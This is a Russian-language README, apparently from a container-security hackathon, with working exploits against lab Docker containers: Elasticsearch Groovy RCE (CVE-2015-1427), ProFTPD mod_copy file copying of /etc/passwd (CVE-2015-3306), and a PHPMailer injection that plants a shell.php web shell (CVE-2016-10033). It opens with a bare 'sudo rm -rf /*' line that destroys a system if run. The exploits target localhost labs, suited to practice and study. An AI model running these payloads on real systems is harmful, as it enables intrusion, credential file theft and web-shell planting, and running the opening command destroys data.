sudo rm -rf /*
===
---
Использованная ОС: kali linux 
Использованная версия docker: 18.09.1 

CVE-2015-1427
===
ElasticSearch Groovy RCE
контейнер: bash/cve-2015-1427.sh
Краткое описание уязвимости: Механизм сценариев Groovy в Elasticsearch до 1.3.8 и 1.4.x до 1.4.3 позволяет удаленным пользователям обходить механизм защиты песочницы и выполнять произвольные команды оболочки с помощью созданного сценария.
Эксплоиты:
Выполнить в терминале
```bash
curl -s http://localhost:9200/_search\?pretty -XPOST -d '{"script_fields": {"myscript": {"script": "java.lang.Math.class.forName(\"java.lang.Runtime\").getRuntime().exec(\"whoami\").getText()"}}}'
```

Python вариант:
Создать файл с кодом ниже и запустить его
```python
import requests
host = 'http://localhost:9200/'
payload1 = '{"size":1, "script_fields": {"myscript":{"script": "java.lang.Math.class.forName(\\"java.lang.Runtime\\").getRuntime().exec(\\"whoami\\").getText()"}}}'

print('exploiting cve-2015-1427 (Container security hackaton)')
req = requests.post(host + '_search?pretty', data=payload1)
print(req.text)
```

В рез-те выполнения нам вернётся результат выполнения команды whoami (а именно root)
Видео: https://youtu.be/W0lYqvhi0iw

CVE-2015-3306
===
контейнер: bash/CVE-2015-3306.sh 
Краткое описание уязвимости: Модуль mod_copy в ProFTPD 1.3.5 позволяет чиать и записывать произвольные файлы через команды site cpfr и site cpto
Описание эксплойта: в рез-те выполнения эксплойта создаётся файл passwd, содержащий содержимое файла /etc/passwd

Экспоит:
nano exploit.sh
```bash
#!/bin/bash

nc localhost 21 <<EOF
SITE CPFR /etc/passwd
SITE CPTO /var/www/html/passwd
EOF
```
chmod +x ./exploit.sh
./exploit.sh
откройте страницу http://localhost/passwd

Видео: https://youtu.be/IYNk7QcGbWE



CVE-2016-10033
===
PHPMail Remote Code Execution
контейнер: bash/CVE-2016-10033.sh 
Краткое описание уязвимости: В PHPMailer до версии 5.2.18 существовала уязвимость, приводящая к уязвимости типа Remote Code Execution. Из-за недостаточной фильтрации символов \' в поле "sender" злоумышленник мог внедрить вредоносный код.
Описание эксплойта: в рез-те выполнения эксплойта создаётся файл shell.php, позволяющий выполнить произвольный код на сервере при помощи параметра cmd.
Экспоит
```bash
curl -sq 'http://localhost:8383' -H 'Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryzXJpHSq4mNy35tHe' --data-binary $'------WebKitFormBoundaryzXJpHSq4mNy35tHe\r\nContent-Disposition: form-data; name="action"\r\n\r\nsubmit\r\n------WebKitFormBoundaryzXJpHSq4mNy35tHe\r\nContent-Disposition: form-data; name="name"\r\n\r\n<?php echo \"Shell\";system($_GET[\'cmd\']); ?>\r\n------WebKitFormBoundaryzXJpHSq4mNy35tHe\r\nContent-Disposition: form-data; name="email"\r\n\r\n\"floppa\\\" -OQueueDirectory=/tmp -X/www/shell.php server\" @test.test\r\n------WebKitFormBoundaryzXJpHSq4mNy35tHe\r\nContent-Disposition: form-data; name="message"\r\n\r\nxD\r\n------WebKitFormBoundaryzXJpHSq4mNy35tHe--\r\n'
```
Видео: https://youtu.be/fwLJwSejeNQ





